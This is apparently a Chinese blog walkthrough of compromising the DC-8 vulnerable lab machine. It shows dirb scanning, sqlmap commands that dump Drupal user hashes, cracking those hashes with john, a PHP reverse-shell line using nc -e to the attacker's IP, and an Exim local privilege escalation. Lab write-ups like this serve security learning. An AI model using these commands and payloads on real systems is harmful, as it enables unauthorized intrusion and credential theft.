---
title: DC_8靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false
---

# DC_8靶机渗透测试

## 信息收集

- 首先先扫描靶机位置和开放的端口
- ip： 192.168.1.5 port：22，80
- CMS：Drupal

![image-20210705023132828](http://cdn.mxrblog.cn/image-20210705023132828.png)

- 爆破目录,发现用户登陆界面

````
dirb http://192.168.1.5
````

![image-20210705101230636](http://cdn.mxrblog.cn/image-20210705101230636.png)

- 访问靶机80端口服务

![image-20210705025722800](http://cdn.mxrblog.cn/image-20210705025722800.png)

- 查看用户登录界面

![image-20210705101351710](http://cdn.mxrblog.cn/image-20210705101351710.png)

- 在用户登陆页面尝试一番后发现无果，然后发现点击侧边栏，在url中出现了nid=1的字段，直觉告诉我有sql注入漏洞（不要问我直觉为什么这么准，网友的直觉都是那么准）

![image-20210705101940951](http://cdn.mxrblog.cn/image-20210705101940951.png)

- 使用sqlmap进行自动化注入看看, 发现数据库d7db

```
sqlmap -u "http://192.168.1.5/?nid=1" --risk=3 --level=5  --random-agent --dbs -dbms=mysql
```

![image-20210705103148642](http://cdn.mxrblog.cn/image-20210705103148642.png)

- 查看表

```
sqlmap -u "http://192.168.1.5/?nid=1" --risk=3 --level=5  --random-agent -D d7db -tables
```

![image-20210705103813487](http://cdn.mxrblog.cn/image-20210705103813487.png)

- 查看列

```
sqlmap -u "http://192.168.1.5/?nid=1" --risk=3 --level=5  --random-agent -D d7db -T users -columns
```

![image-20210705104239406](http://cdn.mxrblog.cn/image-20210705104239406.png)

- 查看密码和姓名（pass name）

```
sqlmap -u "http://192.168.1.5/?nid=1" --risk=3 --level=5  --random-agent -D d7db -T users -C name,pass,uid --dump
```

![image-20210705104531950](http://cdn.mxrblog.cn/image-20210705104531950.png)

- 发现用户名和密码的哈希值，有用户名字john，我们想到了密码破解工具john

```
admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z 
john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
```

- 只得到了john的密码

![image-20210705105845856](http://cdn.mxrblog.cn/image-20210705105845856.png)

- ssh尝试登陆发现无果

![image-20210705110043912](http://cdn.mxrblog.cn/image-20210705110043912.png)

- 进入网站后台， 发现contact us页面可以被修改

![image-20210705110705512](http://cdn.mxrblog.cn/image-20210705110705512.png)

- 在该页面中插入php反弹shell

```
<?php system('nc -e /bin/bash 192.168.1.8 4444')?>
```

![image-20210705111406828](http://cdn.mxrblog.cn/image-20210705111406828.png)

- 攻击机器上监听4444号端口，然后进入contact us页面提交数据进行刷新

![image-20210705111957708](http://cdn.mxrblog.cn/image-20210705111957708.png)

![image-20210705112012648](http://cdn.mxrblog.cn/image-20210705112012648.png)

- 获得交互式shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### 提权

使用命令查看是否有suid的提权的命令

> find / -user root -perm -4000 -print 2>/dev/null

![image-20210705112704121](http://cdn.mxrblog.cn/image-20210705112704121.png)

- 查看exim4版本，发现是4.89

![image-20210705113040929](http://cdn.mxrblog.cn/image-20210705113040929.png)

- 使用searchsploit exim对其进行漏洞检索

![image-20210705120455962](http://cdn.mxrblog.cn/image-20210705120455962.png)

- 使用漏洞文件Exim 4.87 - 4.91 - Local Privilege Escalation对靶机进行提权

![image-20210705120717156](http://cdn.mxrblog.cn/image-20210705120717156.png)

- 将文件传到靶机上

![image-20210705121915838](http://cdn.mxrblog.cn/image-20210705121915838.png)

![image-20210705121929986](http://cdn.mxrblog.cn/image-20210705121929986.png)

- 失败了

  原因是：shell.sh文件的格式为dos格式。linux只能执行格式为unix格式的脚本。

  使用set ff=unix : 告诉 vim 编辑器，使用unix换行符，不然会无法执行脚本。

  所以修改一下攻击机目录下的shell脚本，在脚本最后加上 :set ff=unix（命令行模式添加）

  然后在靶机中重新下载脚本，赋予权限，执行脚本

![image-20210705123615440](http://cdn.mxrblog.cn/image-20210705123615440.png)

- 发现还不是root权限，再看一下漏洞文件

![image-20210705123828233](http://cdn.mxrblog.cn/image-20210705123828233.png)

- 用法说明中提到了我们刚才使用的是默认配置，我们应该切换成nc载荷

![image-20210705124342006](http://cdn.mxrblog.cn/image-20210705124342006.png)

![image-20210705124352704](http://cdn.mxrblog.cn/image-20210705124352704.png)

